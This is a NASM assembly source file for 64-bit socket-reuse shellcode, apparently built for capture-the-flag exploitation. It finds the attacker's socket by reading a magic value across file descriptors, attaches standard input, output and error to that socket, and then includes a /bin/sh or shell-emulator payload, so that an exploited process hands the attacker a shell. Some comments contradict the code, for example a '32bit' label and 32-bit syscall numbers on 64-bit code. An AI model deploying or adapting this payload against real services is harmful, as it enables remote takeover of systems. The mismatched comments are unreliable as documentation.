	;; Evan Jensen 32bit socket reuse shellcode
	;; Paolo Soto
	;; Mon Mar  4 12:03:49 EST 2013
	;; EBX, ECX, EDX, ??? then stack - but we only need 3		
	;; read = 3, dup2 = 63, execve = 11
	%include "short64.s"
	%include "syscall.s"
	%define MAGIC dword 0xcafef00d

BITS 64
global main

%ifdef ELF
	section .mytext progbits alloc exec
%endif
	
main:
	mov rsi,rsp 		; TODO is this too early?
	and rsi,0xf0000		; rsi=some valid stack address

	xor edx, edx
	lea edi, [rdx+20]	;adjust for the popularity of the ctf	
	
	;; rdi is the starting fd to read from, we try each in decending order
	mov dl, 4 ;read 4 bytes	
	mov ebx, MAGIC	
ourread:
	dec rdi 	
%ifdef DEBUG
	jnz ourread.next	
	int 3; this breakpoint triggers if we DON'T find the magic number
	hlt
%endif
	
.next:
	xor eax, eax
	mov al, read
	syscall
	
	cmp  ebx, [rsi]  ;this is our magic number %defined on top
	jnz ourread      ; if we don't match try another file descriptor

	
	;; this dup2 code attaches stdin stdout and stderr to our socket
	;; so that we can talk to whatever program we run later
mydup2:
	xor eax, eax
	lea esi, [rax+2] ; loop count and fd
copy_stdin_out_err:
        mov al, dup2
        syscall
        dec esi
        jns copy_stdin_out_err	


	;; any local shellcode
	;; OUR SOCKET IS IN EBX
	
%define EMULATOR
%ifdef 	EMULATOR
	;;  shell emulating shellcode
	incbin "../64shellEmulator/shellcode"
%else
	;;  ordinary shellcode (/bin/sh)
	incbin "../64BitLocalBinSh/shellcode"
%endif
